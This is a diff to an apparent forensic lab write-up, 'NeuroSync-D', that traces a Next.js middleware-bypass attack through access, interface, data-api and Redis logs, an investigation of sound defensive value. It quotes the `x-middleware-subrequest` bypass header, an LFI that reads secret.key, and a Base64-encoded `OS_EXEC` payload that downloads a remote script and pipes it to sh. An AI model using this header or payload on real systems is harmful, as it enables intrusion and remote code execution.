@@ -164,7 +164,7 @@ https://github.com/YEONDG/nextjs-cve-2025-29927
 
 Static files are likely to be checked via web access, so this can be confirmed through `access.log`.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_1.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_1.png]]
 
 The first file that can be identified in `access.log` is `main-app.js`.
 
@@ -174,7 +174,7 @@ Looking up PoCs or descriptions of the previously identified CVE reveals that th
 
 We search for this header value in the logs.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_2.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_2.png]]
 
 Records of this vulnerability are directly found in `interface.log`, which has a similar format to `access.log`. The vulnerability is exploited with the endpoint `/api/bci/analytics`.
 
@@ -182,13 +182,13 @@ Records of this vulnerability are directly found in `interface.log`, which has a
 
 An "Unauthorized" response corresponds to response number 401.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_3.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_3.png]]
 
 Searching based on this response number yields a total of 5 logs.
 
 #### Q7. At what time was a successful response from the vulnerable endpoint captured, indicating that the middleware was bypassed?
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_4.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_4.png]]
 
 The first successful attempt (returning 200) after the 401 responses was at 2025-04-01 11:38:05.
 
@@ -196,7 +196,7 @@ The first successful attempt (returning 200) after the 401 responses was at 2025
 
 Looking at the vulnerable header values in the previously checked logs, a certain pattern can be observed among the failed attempts.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_5.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_5.png]]
 
 ```
 x-middleware-subrequest: middleware
@@ -213,7 +213,7 @@ Given the failed header values and the timing, it appears the attacker was progr
 
 Looking through the logs, `data-api.log` contains records after the successful attack time of 2025-04-01 11:38:05.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_6.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_6.png]]
 
 The very first log recorded indicates that the "External Analytics" server is running on port 4000.
 
@@ -221,7 +221,7 @@ The very first log recorded indicates that the "External Analytics" server is ru
 
 Continuing to look through the same log, we can see logs where the attacker is attempting Local File Inclusion on the `/logs` endpoint after trying various other endpoints.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_7.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_7.png]]
 
 #### Q11. When was the discovered vulnerable endpoint first used maliciously?
 
@@ -235,7 +235,7 @@ Local File Inclusion
 
 Continuing to scroll down through the log, we can see the last file that was read.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_8.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_8.png]]
 
 The file is secret.key.
 
@@ -243,7 +243,7 @@ The file is secret.key.
 
 Now it's time to check `redis.log`. Looking at the log, we can see a record where a string that appears to be Base64 encoded is entered along with the phrase `OS_EXEC`.
 
-![[Images/content/Security/DFIR/NeuroSync-D/neurosync_9.png]]
+![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_9.png]]
 
 ```
 OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
